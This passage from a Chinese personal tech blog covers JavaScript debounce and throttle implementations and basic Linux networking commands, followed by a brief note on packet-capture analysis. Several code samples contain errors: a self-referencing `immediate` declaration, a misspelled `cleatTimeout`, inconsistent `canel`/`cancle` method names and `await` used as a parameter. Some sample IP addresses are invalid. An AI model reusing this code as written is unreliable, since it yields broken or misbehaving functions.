<h3 id="函数防抖"><a href="#函数防抖" class="headerlink" title="函数防抖"></a>函数防抖</h3><p>函数防抖其实就是函数在跪规定的时间间隔内被多次调用的话，那么函数不会被执行，直到调用的周期大于规定的时间，那么才开始执行函数，并且只执行一次。</p>
<p>函数防抖的基本模式可以简化如下:</p>
<blockquote>
<p>JavaScript高级程序设计中 <code>throttle</code> 其实是函数防抖的实现</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function debounce(method, context)&#123;</span><br><span class="line">	clearTimeout(method.tId)</span><br><span class="line">	method.tId = setTimeout(function()&#123;</span><br><span class="line">		method.call(context)</span><br><span class="line">	&#125;, 500)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在 setTimeout() 中用到的函数其执行环境总是 window</p>
</blockquote>
<p><code>debounce</code> 方法调用实例:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function resizeDiv()&#123;</span><br><span class="line">	var div = document.querySelector(&quot;#block&quot;)</span><br><span class="line">	div.style.height = div.offsetWidth + &quot;px&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">window.onresize = function()&#123;</span><br><span class="line">	debounce(resizeDiv)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如上，如果我们在 <code>500ms</code> 内连续改变窗口的大小，那么 <code>resizeDiv</code> 只会被执行一次，然后该函数永远不会被执行，知道最后停下来的时间超过 <code>500ms</code>。</p>
<p>当然这是个最基本的版本实现，它是存在很多问题的，先不说 <code>fn.timerId</code> 这种形式就不够爽，如果我们的 <code>fn</code> 需要就接受参数呢？或者<code>fn</code>是有返回值的？而且，就目前这个版本实现，函数永远是被延迟执行的，如果需要在函数函数被调用时立即执行呢？</p>
<p>那么，下面直接来看一个 <code>underscore</code> 中 <code>debounce</code> 的实现:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">  *空闲控制，返回函数连续调用时，空闲时间必须大于或者等于 wait，fn 才会被执行</span><br><span class="line">  *</span><br><span class="line">  * */</span><br><span class="line"></span><br><span class="line">  function debounce(fn,wait,immediate) &#123;</span><br><span class="line">    let timer;</span><br><span class="line">    let result;</span><br><span class="line">    // 用于返回 fn 函数的执行结果</span><br><span class="line"></span><br><span class="line">    let debounced = function()&#123;</span><br><span class="line">      let context = this;</span><br><span class="line">      /*</span><br><span class="line">      * 如果，需要在 fn 使用调用该函数的对象的话，会发现 fn 中的 this 是指向 window 的</span><br><span class="line">      * 所以，需要找到 this 对象，并将该对象传递到 fn 函数中</span><br><span class="line">      */</span><br><span class="line">      let args = arguments;</span><br><span class="line">      /*</span><br><span class="line">      *  相应的需要将 args 传递到 fn 中，比如使用 dom.onmousemove = debounce(fn,wait) 时</span><br><span class="line">      *  arguments 代表的就是 event 对象</span><br><span class="line">      * */</span><br><span class="line">			let immediate = immediate || true;</span><br><span class="line">			// 默认情况下，立即执行</span><br><span class="line">      if(timer) clearTimeout(timer);</span><br><span class="line">      if(immediate) &#123;</span><br><span class="line">          // 如果传入 immediate 参数，表示立即执行</span><br><span class="line">        let callNow = !timer;</span><br><span class="line">        // 如果已经被执行过，则不会立即执行</span><br><span class="line">        if (callNow) result = fn.apply(context,args);</span><br><span class="line">        timer = setTimeout(function () &#123;</span><br><span class="line">          timer = null;</span><br><span class="line">          // 使用 timer = null 去判断距离第一次执行是否已经过了 wait 时间</span><br><span class="line">          // 注意 timer = null，与 clearTimeout(timer) 的区别</span><br><span class="line">        &#125;,wait)</span><br><span class="line">      &#125;else &#123;</span><br><span class="line">          timer = setTimeout(function () &#123;</span><br><span class="line">              // 如果没有立即执行，那么由于 setTimeout 的原因 result 将永远是 undefined</span><br><span class="line">            // 所以，我们只在 immediate 的时候返回 fn 函数执行的结果</span><br><span class="line">             fn.apply(context,args);</span><br><span class="line">          &#125;,wait)</span><br><span class="line">      &#125;</span><br><span class="line">      return result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    debounced.canel = function () &#123;</span><br><span class="line">      cleatTimeout(timer);</span><br><span class="line">      timer = null;</span><br><span class="line">    &#125;</span><br><span class="line">    return debounced;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>调用实例:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var lazyLayout = debounce(calculateLayout, 300);</span><br><span class="line">$(window).resize(lazyLayout);</span><br><span class="line">// lazyLayout.cancle(); // 取消函数防抖</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/mqyqingfeng/Blog/issues/22" target="_blank" rel="noopener">soure</a></p>
<hr>
<h3 id="throttle"><a href="#throttle" class="headerlink" title="throttle"></a>throttle</h3><p>函数节流的实现方式有两种，时间戳和定时器。我们先看看时间戳。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function throttle(fn,wait) &#123;</span><br><span class="line">      let last=0;</span><br><span class="line">      return function () &#123;</span><br><span class="line">        let now = +new Date();</span><br><span class="line">        let context = this;</span><br><span class="line">        let args  = arguments;</span><br><span class="line">        if (last + wait &lt; now) &#123;</span><br><span class="line">            fn.apply(context,args);</span><br><span class="line">            last = now;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>再看使用定时器实现的版本:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function throttle(fn,wait) &#123;</span><br><span class="line">    let timeout ;</span><br><span class="line">    return function () &#123;</span><br><span class="line">      let context = this;</span><br><span class="line">      let args = arguments;</span><br><span class="line">      if(!timeout) &#123;</span><br><span class="line">        timeout = setTimeout(function () &#123;</span><br><span class="line">          timeout = null;</span><br><span class="line">          fn.apply(context,args);</span><br><span class="line">        &#125;,wait)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 两者一比较，我们发现使用时间戳的版本，<code>fn</code> 会在被调用的时刻被立即执行，而使用定时器的版本则是在等待 <code>wait</code> 后才会执行。</p>
<p> 那么，如果我们将两者结合在一起呢，就是鼠标移入能立刻执行，停止触发的时候还能再执行一次！</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">function throttle(fn, await)&#123;</span><br><span class="line">	let timeout = null;</span><br><span class="line">	let result = null;</span><br><span class="line">	let lastRun = 0;</span><br><span class="line">	let throttled =  function()&#123;</span><br><span class="line">		let context = this;</span><br><span class="line">		let args = arguments;</span><br><span class="line">		let now = + new Date() || Date.now();</span><br><span class="line">		const elapsed = now -lastRun - await;</span><br><span class="line"></span><br><span class="line">		const runCallback = function()&#123;</span><br><span class="line">			timeout = null;</span><br><span class="line">			lastRun = now;</span><br><span class="line">			fn.apply(context,args);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if(elapsed &gt;= 0)&#123;</span><br><span class="line">			if(timeout)&#123;</span><br><span class="line">				// 判断定时器是否存在，因为定时器的不准确性，很可能存在等待时间到期后，定时器并没执行的情况。</span><br><span class="line">				clearTimeout(timeout);</span><br><span class="line">				timeout = null;</span><br><span class="line">			&#125;</span><br><span class="line">			lastRun =  now;</span><br><span class="line">			fn.apply(context,args);</span><br><span class="line"></span><br><span class="line">		&#125;else if(!timeout)&#123;</span><br><span class="line">			// 保证事件停止触发以后会再执行一次</span><br><span class="line">			timeout = setTimeout(runCallback,await)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	throttled.cancle = function()&#123;</span><br><span class="line">		// 取消</span><br><span class="line">		clearTimeout(timeout);</span><br><span class="line">		timeout = null;</span><br><span class="line">		lastRun = 0;</span><br><span class="line">	&#125;</span><br><span class="line">	return throttled;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/06/18/第五章-常用网络指令/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="onejustonee">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="onejustone">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/06/18/第五章-常用网络指令/" itemprop="url">常用网络指令</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-18T00:00:00+08:00">
                2016-06-18
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/technology/" itemprop="url" rel="index">
                    <span itemprop="name">technology</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="ifconfig-查询，设置网卡与ip相关参数"><a href="#ifconfig-查询，设置网卡与ip相关参数" class="headerlink" title="ifconfig:查询，设置网卡与ip相关参数"></a>ifconfig:查询，设置网卡与ip相关参数</h4><h5 id="默认不加参数表示观察所有网络接口"><a href="#默认不加参数表示观察所有网络接口" class="headerlink" title="默认不加参数表示观察所有网络接口"></a>默认不加参数表示观察所有网络接口</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# ifconfig</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 3c:97:0e:80:50:72  </span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">wlan0     Link encap:Ethernet  HWaddr 54:16:71:a6:a8:39  </span><br><span class="line">          inet addr:100.320.140.34  Bcast:442.230.310.315 Mask:255.255.255.240</span><br><span class="line">          inet6 addr: fe80::a617:31ff:fef6:d859/64 Scope:Lin</span><br><span class="line">          RX bytes:2318382 (2.2 MiB)  TX bytes:1054948 (1.0 MiB)</span><br></pre></td></tr></table></figure>
<h5 id="给予eth0一个IP："><a href="#给予eth0一个IP：" class="headerlink" title="给予eth0一个IP："></a>给予eth0一个IP：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# ifconfig eth0 192.168.1.23</span><br><span class="line">#如不加其他参数，系统会自动依照该IP所在class范围计算出netmask和network，#broadcast等参数</span><br></pre></td></tr></table></figure>
<h5 id="添加上其他的参数同时设定MTU的值"><a href="#添加上其他的参数同时设定MTU的值" class="headerlink" title="添加上其他的参数同时设定MTU的值"></a>添加上其他的参数同时设定MTU的值</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# ifconfig eth0 192.168.1.23\</span><br><span class="line">&gt; netmask 255.255.255.0 mtu 8000</span><br></pre></td></tr></table></figure>
<h5 id="在一张网卡上设置多个ip"><a href="#在一张网卡上设置多个ip" class="headerlink" title="在一张网卡上设置多个ip"></a>在一张网卡上设置多个ip</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# ifconfig eth0:0 192.168.0.193</span><br></pre></td></tr></table></figure>
<h5 id="启动关闭网卡"><a href="#启动关闭网卡" class="headerlink" title="启动关闭网卡"></a>启动关闭网卡</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# ifconfig eth0/wlan0  down/up</span><br></pre></td></tr></table></figure>
<h5 id="恢复系统默认配置，重启网络"><a href="#恢复系统默认配置，重启网络" class="headerlink" title="恢复系统默认配置，重启网络"></a>恢复系统默认配置，重启网络</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# /etc/init.d/network restart</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="路由修改-route"><a href="#路由修改-route" class="headerlink" title="路由修改 route"></a>路由修改 route</h4><h5 id="单纯的观察路由"><a href="#单纯的观察路由" class="headerlink" title="单纯的观察路由"></a>单纯的观察路由</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# route -n</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">0.0.0.0         172.20.10.1     0.0.0.0         UG    1024   0        0 wlan0</span><br><span class="line">172.20.10.0     0.0.0.0         255.255.255.240 U     0      0        0 wlan0</span><br></pre></td></tr></table></figure>
<p>Destination, Genmask：这两个就是分别是 network 与netmask<br>Gateway：该网域是通过哪个 gateway 连接出去的<br>Flags：总共有多个旗标，代表的意义如下：<br>U(route is up):该路由是启动的<br>G(use gateway):需要通过外部的主机(gateway)来传递封包</p>
<h5 id="增加一个路由"><a href="#增加一个路由" class="headerlink" title="增加一个路由"></a>增加一个路由</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# route add -net 192.168.100.1\</span><br><span class="line">&gt; netmask 255.255.255.0 dev eth0</span><br></pre></td></tr></table></figure>
<h5 id="删除一个路由"><a href="#删除一个路由" class="headerlink" title="删除一个路由"></a>删除一个路由</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# route del -net 192.168.100.1\</span><br><span class="line">&gt; netmask 255.255.255.0 dev eth0</span><br></pre></td></tr></table></figure>
<h5 id="增加一个默认路由"><a href="#增加一个默认路由" class="headerlink" title="增加一个默认路由"></a>增加一个默认路由</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# route add default gw 192.158.1.250</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="网络参数综合指令-ip"><a href="#网络参数综合指令-ip" class="headerlink" title="网络参数综合指令 ip"></a>网络参数综合指令 ip</h4><p>ip只能在功能上可以说是ifconfig，ifup，ifdown，route的众合指令集，Ip指令后续在了解。<br>pass</p>
<hr>
<h4 id="无线网络-iwlist-wiconfig"><a href="#无线网络-iwlist-wiconfig" class="headerlink" title="无线网络 iwlist,wiconfig"></a>无线网络 iwlist,wiconfig</h4><ul>
<li><p><strong>iwlist:</strong> 利用无线网卡进行无线 AP 的探测与取得相关的数据</p>
</li>
<li><p><strong>iwconfig:</strong> 设定无线网卡的相关参数</p>
</li>
</ul>
<hr>
<h4 id="使用DHCP获得Ip-dhclient"><a href="#使用DHCP获得Ip-dhclient" class="headerlink" title="使用DHCP获得Ip:dhclient"></a>使用DHCP获得Ip:dhclient</h4><p>如果我们的IP是局域网内通过DHCP服务器自动分配的，那么可以直接使用dhclient命令，为网卡取得ip</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# dhclient eth0</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="0x01-网络排查指令"><a href="#0x01-网络排查指令" class="headerlink" title="0x01 网络排查指令"></a>0x01 网络排查指令</h3><hr>
<h4 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h4><p>ping主要用来探测两个主机之间的连接状态。</p>
<h5 id="每间隔1秒发送三个包检查百度主机是否存在"><a href="#每间隔1秒发送三个包检查百度主机是否存在" class="headerlink" title="每间隔1秒发送三个包检查百度主机是否存在"></a>每间隔1秒发送三个包检查百度主机是否存在</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# ping -W1 -c3 www.baidu.com</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h4><p>追踪两部主机之间通过的各个节点 (node) 通讯状况。</p>
<h5 id="使用tcp协议侦测本机到-yahoo-去的各节点联机状态"><a href="#使用tcp协议侦测本机到-yahoo-去的各节点联机状态" class="headerlink" title="使用tcp协议侦测本机到 yahoo 去的各节点联机状态"></a>使用tcp协议侦测本机到 yahoo 去的各节点联机状态</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# traceroute -w 1 -n -T tw.yahoo.com</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="netstat-查看本机网络端口"><a href="#netstat-查看本机网络端口" class="headerlink" title="netstat 查看本机网络端口"></a>netstat 查看本机网络端口</h4><h5 id="列出目前已经启动的网络服务"><a href="#列出目前已经启动的网络服务" class="headerlink" title="列出目前已经启动的网络服务"></a>列出目前已经启动的网络服务</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# netstat - tulnp</span><br></pre></td></tr></table></figure>
<h5 id="检查本机的80端口是否监听"><a href="#检查本机的80端口是否监听" class="headerlink" title="检查本机的80端口是否监听"></a>检查本机的80端口是否监听</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# netstat  -l localhost:80</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="host"><a href="#host" class="headerlink" title="host"></a>host</h4><h5 id="查询某个主机名对应的IP"><a href="#查询某个主机名对应的IP" class="headerlink" title="查询某个主机名对应的IP"></a>查询某个主机名对应的IP</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# host www.baidu.com</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h4><p>与host一样的，同时host与nslooup都可以使用dig命令来代替了</p>
<hr>
<h3 id="0x02-远程连接"><a href="#0x02-远程连接" class="headerlink" title="0x02 远程连接"></a>0x02 远程连接</h3><hr>
<h4 id="telent"><a href="#telent" class="headerlink" title="telent"></a>telent</h4><h5 id="尝试telent-baidu-com"><a href="#尝试telent-baidu-com" class="headerlink" title="尝试telent baidu.com"></a>尝试telent baidu.com</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# telent www.baidu.com 80</span><br></pre></td></tr></table></figure>
<h5 id="使用telent检查本机端口是否正常开启"><a href="#使用telent检查本机端口是否正常开启" class="headerlink" title="使用telent检查本机端口是否正常开启"></a>使用telent检查本机端口是否正常开启</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# telent localhost:80</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="0x03-文字接口网页浏览器"><a href="#0x03-文字接口网页浏览器" class="headerlink" title="0x03 文字接口网页浏览器"></a>0x03 文字接口网页浏览器</h3><hr>
<h4 id="links-文字接口浏览器"><a href="#links-文字接口浏览器" class="headerlink" title="links:文字接口浏览器"></a>links:文字接口浏览器</h4><h5 id="links查看本机上的html文件"><a href="#links查看本机上的html文件" class="headerlink" title="links查看本机上的html文件"></a>links查看本机上的html文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# links /usr/doc/html/index.html</span><br></pre></td></tr></table></figure>
<p>通过links+dump参数将sina.com的网页内容整个抓取下来存储</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# links -dump http://sina.com &gt; sina.html</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="wget-文字接口下载器"><a href="#wget-文字接口下载器" class="headerlink" title="wget:文字接口下载器"></a>wget:文字接口下载器</h4><h5 id="wget网页数据的取得"><a href="#wget网页数据的取得" class="headerlink" title="wget网页数据的取得"></a>wget网页数据的取得</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# wget 网站网址</span><br></pre></td></tr></table></figure>
<p>wget不必透过浏览器，只要知道网址后，立即可以进行档案的下载， 又快速又方便，还可以透过 proxy 来下载，透过修改 /etc/wgetrc 来设定你的代理服务器：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@jack:~# vim /etc/wgetrc</span><br><span class="line"># You can set the default proxies for Wget to use for http, https, and ftp.</span><br><span class="line"># They will override the value in the environment.</span><br><span class="line">#https_proxy = http://proxy.yoyodyne.com:18023/</span><br><span class="line">#http_proxy = http://proxy.yoyodyne.com:18023/</span><br><span class="line">#ftp_proxy = http://proxy.yoyodyne.com:18023/</span><br><span class="line"># If you do not want to use proxy at all, set this to off.</span><br><span class="line">#use_proxy = on</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="0x04-特殊工具"><a href="#0x04-特殊工具" class="headerlink" title="0x04 特殊工具"></a>0x04 特殊工具</h4>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/06/15/非加密类型协议分析/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="onejustonee">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="onejustone">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/06/15/非加密类型协议分析/" itemprop="url">非加密类型协议分析</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-15T21:00:00+08:00">
                2016-06-15
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/technology/" itemprop="url" rel="index">
                    <span itemprop="name">technology</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>抓包分析是非常考验个人对各种网络协议的理解的，这些都是需要经过历练的，我们需要在不断的摸索和认知中提高自己的网络分析能力。</p>
<p>再计算机的世界中，只有0和1两数字，同时0和1也构建了整个网络，数据流里传输的只有0和1，所以通过抓包得到的也只有0和1，显然人类不可能通过一连串的0和1窥探计算机的一切。</p>
<p>那么，抓包软件应运而生(显然，对于加密类型的协议：https,ssh2.0等等，抓包软件基本就是摆设了)。转包软件可以将0和1转换成为人类可识别的语言。</p>
<p>###<br>当每天面对几百G的网络流量，如何应对突如其来的流浪分析。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/06/15/缓冲区溢出+Pop3+Fuzzing/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="onejustonee">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="onejustone">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/06/15/缓冲区溢出+Pop3+Fuzzing/" itemprop="url">缓冲区溢出</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-15T20:30:00+08:00">
                2016-06-15
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/technology/" itemprop="url" rel="index">
                    <span itemprop="name">technology</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
